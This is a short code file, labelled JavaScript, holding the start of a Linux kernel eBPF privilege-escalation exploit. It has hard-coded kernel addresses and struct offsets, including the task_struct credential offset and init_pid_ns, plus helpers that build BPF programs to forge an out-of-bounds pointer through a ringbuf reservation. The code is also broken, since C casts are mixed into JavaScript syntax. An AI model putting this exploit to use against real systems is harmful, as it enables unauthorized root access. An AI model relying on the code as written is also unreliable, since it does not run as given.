```javascript
const DATA_SIZE = 320;
const CACHE_SIZE = 0x400;
const MAP_VALUE_OFFSET = 0x110;
const OFFSET_TO_NEXT_MAP = CACHE_SIZE - MAP_VALUE_OFFSET;

const MAP_BTF_OFFSET = 0x40;
const BTF_ID_OFFSET = 0x58;

const MAP_MUTEX_WAIT_LIST_OFFSET = 0xc0;
const MAP_SPIN_LOCK_OFF_OFFSET = 0x2c;
const MAP_MAX_ENTRIES_OFFSET = 0x24;
const MAP_MAP_TYPE_OFFSET = 0x18;

const NS_TASK_STRUCT_OFFSET = 0x30;

const TASK_STRUCT_PID_OFFSET = 0x920;
const TASK_STRUCT_CRED_OFFSET = 0xae8;
const TASK_STRUCT_NEXT_OFFSET = 0x818;

const INIT_PID_NS = 0xffffffff82e6d040;
const ARRAY_MAP_GET_NEXT_KEY = 0xffffffff81219fb0;

let exploit_context = {
   ringbuf_map_fd: 0,
   a_fd: 0,
   b_fd: 0,
   prog_fd: 0,
   kernel_slide: 0
};

function get_invalid_pointer(oob_map_fd, dest_reg, value) {
    return [
        BPF_LD_MAP_FD(BPF_REG_1, oob_map_fd),
        BPF_MOV64_IMM(BPF_REG_2, (unsigned int)0),
        BPF_MOV64_IMM(BPF_REG_3, (unsigned int)0xffffffffffffffff),
        BPF_EMIT_CALL(BPF_RINGBUF_RESERVE),
        BPF_MOV64_REG(dest_reg, BPF_REG_0),
        BPF_ALU64_IMM(BPF_ADD, dest_reg, value-1),
        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 5),
        BPF_MOV64_REG(BPF_REG_1, BPF_REG_0),
        BPF_MOV64_IMM(BPF_REG_2, (unsigned int)0),
        BPF_EMIT_CALL(BPF_RINGBUF_DISCARD),
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
        BPF_ALU64_IMM(BPF_ADD, dest_reg, 1)
    ];
}

function get_map_value_pointer(map_fd, key, dest_reg) {
    return [
        BPF_LD_MAP_FD(BPF_REG_1, map_fd),
        BPF_MOV64_IMM(BPF_REG_0, key),
        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 2),
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
        BPF_MOV64_REG(dest_reg, BPF_REG_0)
    ];
}
```
